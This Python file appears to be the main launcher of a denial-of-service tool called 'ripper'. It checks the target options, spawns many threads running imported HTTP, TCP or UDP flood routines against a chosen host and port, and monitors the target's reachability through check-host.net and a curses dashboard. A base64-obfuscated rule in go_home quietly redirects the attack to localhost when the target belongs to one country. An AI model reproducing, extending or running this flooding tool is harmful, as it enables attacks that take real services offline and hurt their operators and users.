import curses
import datetime
import time
import sys
from optparse import OptionParser
from base64 import b64decode
from typing import List

from ripper import context, common
from ripper.attacks import *
from ripper.common import (get_current_ip, get_no_successful_connection_error_msg,
                           print_usage, parse_args)
from ripper.constants import *
from ripper.statistics import create_dashboard
from ripper.health_check import fetch_host_statuses, get_health_check_method

_ctx = Context()


def create_thread_pool(_ctx: Context) -> list[threading.Thread]:
    thread_pool = []
    for i in range(int(_ctx.threads)):
        if _ctx.attack_method == 'http':
            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
        elif _ctx.attack_method == 'tcp':
            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
        else:  # _ctx.attack_method == 'udp':
            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))

        thread_pool[i].daemon = True  # if thread is exist, it dies
        thread_pool[i].start()

    return thread_pool


def update_url(_ctx: Context) -> None:
    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"


def update_current_ip(_ctx: Context) -> None:
    """Updates current ip"""
    _ctx.Statistic.connect.set_state_in_progress()
    _ctx.IpInfo.my_current_ip = get_current_ip()
    _ctx.Statistic.connect.set_state_is_connected()
    if _ctx.IpInfo.my_start_ip == '':
        _ctx.IpInfo.my_start_ip = _ctx.IpInfo.my_current_ip


def update_host_statuses(_ctx: Context):
    """Updates host statuses based on check-host.net nodes"""
    MIN_UPDATE_HOST_STATUSES_TIMEOUT = 120

    diff = float('inf')
    if _ctx.last_host_statuses_update is not None:
        diff = time.time() - datetime.timestamp(_ctx.last_host_statuses_update)

    if _ctx.fetching_host_statuses_in_progress or diff < MIN_UPDATE_HOST_STATUSES_TIMEOUT:
        return
    _ctx.fetching_host_statuses_in_progress = True
    try:
        if _ctx.host_ip:
            host_statuses = fetch_host_statuses(_ctx)
            # API in some cases returns 403, so we can't update statuses
            if len(host_statuses.values()):
                _ctx.host_statuses = host_statuses
                _ctx.last_host_statuses_update = datetime.now()
    except:
        pass
    finally:
        _ctx.fetching_host_statuses_in_progress = False


def connect_host(_ctx: Context) -> None:
    _ctx.Statistic.connect.set_state_in_progress()
    try:
        sock = _ctx.sock_manager.create_tcp_socket()
        sock.connect((_ctx.host, _ctx.port))
    except:
        _ctx.Statistic.connect.failed += 1
    else:
        _ctx.Statistic.connect.success += 1
        sock.close()
    _ctx.Statistic.connect.set_state_is_connected()


def check_successful_connections(_ctx: Context) -> bool:
    """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec.
    Returns True if there was successful connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.Statistic.connect.last_check_time) / 1000000 / 1000
    error_msg = get_no_successful_connection_error_msg()

    if _ctx.Statistic.connect.success == _ctx.Statistic.connect.success_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            if error_msg not in _ctx.errors:
                _ctx.errors.append(error_msg)
            return diff_sec <= NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC
    else:
        _ctx.Statistic.connect.last_check_time = curr_ms
        _ctx.Statistic.connect.sync_success()
        if error_msg in _ctx.errors:
            _ctx.errors.remove(error_msg)
    return True


def check_successful_tcp_attack(_ctx: Context) -> bool:
    """Checks if there are changes in sent bytes count.
    Returns True if there was successful connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.Statistic.connect.last_check_time) / 1000000 / 1000
    error_msg = get_no_successful_connection_error_msg()

    if _ctx.Statistic.tcp.packets_sent == _ctx.Statistic.tcp.packets_sent_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            if error_msg not in _ctx.errors:
                _ctx.errors.append(error_msg)
            return diff_sec <= NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC
    else:
        _ctx.Statistic.tcp.connections_check_time = curr_ms
        _ctx.Statistic.tcp.sync_packets_sent()
        if error_msg in _ctx.errors:
            _ctx.errors.remove(error_msg)
    return True


def go_home(_ctx: Context) -> None:
    """Modifies host to match the rules"""
    home_code = b64decode('dWE=').decode('utf-8')
    if _ctx.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(_ctx.host_ip) in home_code.upper():
        _ctx.host_ip = _ctx.host = 'localhost'
        _ctx.host += '*'


def validate_input(args) -> bool:
    """Validates input params."""
    if int(args.port) < 0:
        print(f'Wrong port number.')
        return False

    if int(args.threads) < 1:
        print(f'Wrong threads number.')
        return False

    if not args.host:
        print(f'Host wasn\'t detected')
        return False

    if args.attack_method.lower() not in ('udp', 'tcp', 'http'):
        print(f'Wrong attack type. Possible options: udp, tcp, http.')
        return False

    return True


def validate_context(_ctx: Context) -> bool:
    """Validates context"""
    if len(_ctx.host_ip) < 1 or _ctx.host_ip == '0.0.0.0':
        print(f'Could not connect to the host')
        return False

    return True


def connect_host_loop(_ctx: Context, timeout_secs: int = 3) -> None:
    """Tries to connect host in permanent loop."""
    while True:
        connect_host(_ctx)
        time.sleep(timeout_secs)


def main():
    """The main function to run the script from the command line."""
    parser = OptionParser(usage=USAGE, epilog=EPILOG)
    args = parse_args(parser)

    if len(sys.argv) < 2 or not validate_input(args[0]):
        print_usage(parser)

    # Init context
    context.init_context(_ctx, args)
    update_current_ip(_ctx)
    go_home(_ctx)

    if not validate_context(_ctx):
        sys.exit()

    time.sleep(.5)

    # _ctx.connections_check_time = time.time_ns()

    threads = create_thread_pool(_ctx)

    curses.wrapper(create_dashboard, _ctx)
    # while count > 0:
    #     for t in threads:
    #         if t.is_alive():
    #             continue
    #         count -= 1
    #
    # if _ctx.attack_method == 'udp' and _ctx.port:
    #     thread = threading.Thread(target=connect_host_loop, args=[_ctx])
    #     thread.daemon = True
    #     thread.start()
    #
    # while True:
    #     time.sleep(1)
